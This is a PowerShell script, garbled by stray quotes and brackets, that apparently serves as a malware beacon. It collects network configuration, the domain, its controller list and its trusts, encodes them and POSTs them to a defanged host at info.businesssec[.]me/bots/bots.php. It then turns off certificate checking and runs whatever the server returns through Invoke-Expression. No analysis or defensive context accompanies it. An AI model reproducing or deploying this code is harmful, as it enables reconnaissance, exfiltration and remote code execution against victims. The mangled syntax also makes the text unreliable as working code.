$obj = Get-WmiObject -Class Win32_NetworkAdapterConfiguration -Filter IPEnabled=TRUE -ComputerName . $obj = $obj | Select-Object DHCPEnabled,
"IPAddress",
"DefaultIPGateway",
"DNSDomain",
"ServiceName",
"Description",
"Index;$domain = $env":"USERDOMAIN$dclist = nltest.exe /DCLIST":$domain$dtrust = nltest.exe /domain_trusts$obj | Add-Member -MemberType NoteProperty -Name dclist -Value $dclist$obj | Add-Member -MemberType NoteProperty -Name dtrust -Value $dtrust$info = ($obj | ConvertTo-Xml -AS String -Depth 1 -NoTypeInformation)$Bytes =[
   "System.Text.Encoding"
]::"Unicode.GetBytes($info)$EncodedText ="[
   "Convert"
]::ToBase64String($Bytes)function StringToHex($i){
   "$r =""""$i.ToCharArray() | foreach-object -process"{
      "$r +=""{0:X}""-f"[
         "int"
      ][
         "char"
      ]"$_"
   }"return $r"
}"$info = StringToHex $EncodedText$Body = @""key=<KEY>&data="@;$Body = $Body + $info;$BodyBytes = $Body;$URI1 ="https://info.businesssec[.]me/bots/bots.php"$http_request = New-Object -ComObject Msxml2.XMLHTTP;$http_request.open("POST",
$URI1,
"$false)$http_request.setRequestHeader(""Content-type",
"application/x-www-form-urlencoded"");$http_request.setRequestHeader(""Content-length",
"$BodyBytes.length);try"{
   "$http_request.send($BodyBytes);    $Data = $http_request.responseText;"
}"Catch"{
   "$Encoder ="[
      "system.Text.Encoding"
   ]::UTF8;    try{
      "$AllProtocols ="[
         "System.Net.SecurityProtocolType"
      ]"Ssl3,Tls,Tls11,Tls12"
   }"Catch"{
      "$AllProtocols ="[
         "System.Net.SecurityProtocolType"
      ]"Ssl3,Tls"; $URI1 = $URI1 -replace"https://",
      "http://"";"
   }[
      "System.Net.ServicePointManager"
   ]::"SecurityProtocol = $AllProtocols;"[
      "System.Net.ServicePointManager"
   ]::"ServerCertificateValidationCallback ="{
      "$true"
   }";        $webClient = New-Object System.Net.WebClient;    $webClient.Headers.Add(""Content-Type",
   "application/x-www-form-urlencoded");    $DataBytes = $webClient.UploadData($URI1,
   "POST",
   "$Encoder.GetBytes($BodyBytes));    $Data = $Encoder.GetString($DataBytes);"
}"Invoke-Expression $Data"
